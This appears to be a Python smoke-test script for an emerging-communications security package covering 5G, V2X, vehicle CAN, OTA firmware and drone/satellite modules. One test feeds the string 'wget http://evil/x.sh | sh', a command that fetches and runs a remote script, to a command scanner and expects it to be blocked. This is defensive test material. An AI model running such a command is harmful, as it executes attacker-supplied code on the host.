# -*- coding: utf-8 -*-
"""第29轮方向4 新兴通信安全 - 冒烟测试。"""
from __future__ import annotations

import importlib
import os
import sys

ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)

failures = []


def check(name, cond, detail=""):
    mark = "OK" if cond else "FAIL"
    print(f"[{mark}] {name} {detail}")
    if not cond:
        failures.append(name)


# 1. 模块独立 import
print("=== 模块独立 import ===")
mods = [
    "emerging_comm_security",
    "emerging_comm_security.5g_security",
    "emerging_comm_security.v2x_security",
    "emerging_comm_security.vehicle_security",
    "emerging_comm_security.ota_security",
    "emerging_comm_security.emerging_comm",
    "emerging_comm_security.emerging_comm_dashboard",
]
for m in mods:
    try:
        mod = importlib.import_module(m)
        check(f"import {m}", True)
    except Exception as e:
        check(f"import {m}", False, str(e))

# 2. 真实功能冒烟
print("\n=== 真实功能冒烟 ===")
m5g = importlib.import_module("emerging_comm_security.5g_security")
cv = m5g.get_5g_controller()
check("5G 默认 NF 节点 >= 9", len(cv.list_nfs()) >= 9)
ev = cv.run_5g_aka("imsi-460011234567890")
check("5G-AKA 认证通过", ev["verified"] is True)
check("5G-AKA 产生 SUPI/SUCI/临时 GUTI",
      bool(cv.subscribers["imsi-460011234567890"].guti))
cross = cv.detect_cross_slice_attack(
    {"src_slice": "5G:1:000001", "dst_slice": "5G:2:000002", "volume_mb": 999})
check("跨切片攻击检测返回结构", "suspicious" in cross)

mv2x = importlib.import_module("emerging_comm_security.v2x_security")
cv2 = mv2x.get_v2x_controller()
msg = cv2.ingest_message("BSM", "anon-demo", {"lat": 25.03, "lon": 102.71})
check("V2X BSM 消息接受", msg.get("accepted") is True)
obus = [n for n in cv2.nodes.values() if n.node_type == "OBU"]
rev = cv2.revoke_cert(obus[0].cert_id)
check("V2X 证书撤销", rev is True)

mveh = importlib.import_module("emerging_comm_security.vehicle_security")
cvh = mveh.get_vehicle_controller()
attack = cvh.ingest_can_frame(0x000, b"\xff" * 8, "ECU-X")
check("车载 CAN 攻击检测触发", bool(attack.get("threats")))
rce = cvh.scan_remote_command("sess-xyz", "wget http://evil/x.sh | sh")
check("车载 RCE 命令拦截", rce["allowed"] is False)

mota = importlib.import_module("emerging_comm_security.ota_security")
co = mota.get_ota_controller()
fw = co.publish_firmware("1.3.0", "IVI", release_notes="smoke")
v = co.verify_firmware(fw.fw_id)
check("OTA 固件签名验证", v["valid"] is True)
t = co.start_install("LVGBE21KXNS000001", fw.fw_id, user_consent=True)
co.advance_install(t.task_id, "VERIFYING")
co.finish_install(t.task_id, success=True)
check("OTA 安装完成", co.device_versions["LVGBE21KXNS000001"] == "1.3.0")

mnew = importlib.import_module("emerging_comm_security.emerging_comm")
cn = mnew.get_emerging_comm_controller()
check("新兴通信默认卫星 >= 12", len(cn.list_satellites()) >= 12)
q = cn.distribute_qkey("QKD-1", 512)
check("量子密钥分发", q["total_bits"] >= 1536)
drone = cn.register_drone("tester", 25.03, 102.71, 80)
check("无人机禁飞区告警触发", drone.no_fly_zone is True)

# 3. 路由 import + 端点数
print("\n=== 路由 ===")
try:
    import api_server.emerging_comm_security_routes as routes  # type: ignore
    check("路由模块 import", True)
    r = routes.router
    n = len([x for x in r.routes])
    check(f"路由端点 >= 50 (实际 {n})", n >= 50)
except Exception as e:
    check("路由模块 import", False, str(e))

# 4. 控制台 HTML 大小
print("\n=== 控制台 ===")
html_path = os.path.join(ROOT, "api_server", "emerging_comm_security_console.html")
size = os.path.getsize(html_path)
check(f"HTML 大小 > 15KB (实际 {size} bytes)", size > 15 * 1024)

print("\n=== 结果 ===")
if failures:
    print(f"FAILED: {len(failures)} 项")
    for f in failures:
        print(" -", f)
    sys.exit(1)
print("ALL SMOKE TESTS PASSED")
